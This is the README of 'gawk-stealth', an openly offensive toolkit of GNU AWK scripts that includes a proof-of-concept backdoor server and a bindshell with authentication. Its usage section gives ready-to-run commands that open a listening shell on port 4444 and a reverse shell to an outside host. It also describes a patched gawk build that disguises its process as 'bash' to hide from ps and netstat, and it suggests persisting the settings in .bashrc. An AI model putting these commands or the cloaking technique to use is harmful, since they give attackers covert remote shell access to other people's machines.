#[gawk-stealth](http://gitbrew.org/gawk)  
##Copyright (C) 2012 Iadnah [<iadnah@gitbrew.org>](mailto:iadnah@gitbrew.org)  
##gawk-stealth is distributed under the GNU GPL  
  
  
###SYNOPSIS  
  
Gawk-Stealth consists of two parts: a set of scripts that can be run from within GNU AWK (using the -f option), and a statically linked 32-bit version of GNU AWK that is patched with our Romulan Cloaking technology.  
  
The scripts included in gawk-stealth are:  
banner_grab.gawk - simple awk banner grabber
banner_grab_pastable.gawk - one-line pastable version of the banner grabber
gawk_get.gawk - script to make an HTTP (no HTTPS) request and dump output to STDOUT
gawk_http_bnc.gawk - Listens on a port and when a connection is made to it, performs an HTTP request as configured and redirects output to connecting host
gawkserv.gawk - Very simple POC backdoor server
rgawkcmd-0.2.gawk - Full-featured bindshell with listen, reverse-connect, and authentication options
  
###COMPILING gawk32.static    
  
To compile, untar the version of gawk in static_gawk, apply the gawk-3.1.8_gawkhide.patch, and compile using the makestatic script.  
  
###SAMPLE USES  
  
The main script of interest is rgawkcmd-0.2.gawk.  When using it, the most important thing to keep in mind is that options are set using environmental variables.  In bash, you may set these with the export command, or to make more persistent you can add the env vars to .bashrc in the home directory.  

To make a listening bindshell with rgawkcmd-0.2.gawk, issue the following commands:  

	$ export RGC_LPORT=4444
	$ export RGC_MODE="listen"
	$ gawk -f rgawkcmd-0.2.gawk

This will open up a listening bindshell on port 4444.  To do a reverse bindshell, you would enter:  

	$ export RGC_MODE="remote"
	$ export RGC_RPORT=4444
	$ export RGC_HOST="totallylegitimate.nationalbankofuganda.com"
	$ gawk -f rgawkcmd-0.2.gawk
	
###ROMULAN CLOAKING TECHNOLOGY

In order to turn on Romulan Cloaking Device (reverse engineered by CDR Data from a Romulan Warbird captured by CPT Jean-Luc Picard), set GAWK_HIDE to anything but NULL.  Example:  

	$ export GAWK_HIDE=1
	
This changes argv[0] to read "bash" (for ps and netstat purposes).  
NOTE: this requires you use patched version of GNU AWK included with this package.  

##LICENSE  
gawk-stealth Copyright (C) 2012 Iadnah iadnah@gitbrew.org

This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

See the COPYING file for more information.

---
Iadnah [<iadnah@gitbrew.org>](mailto:iadnah@gitbrew.org)  
Security Consultant  
[gitbrew.org](http://gitbrew.org)  
[Hephaestus Security](http://hephaestussec.com)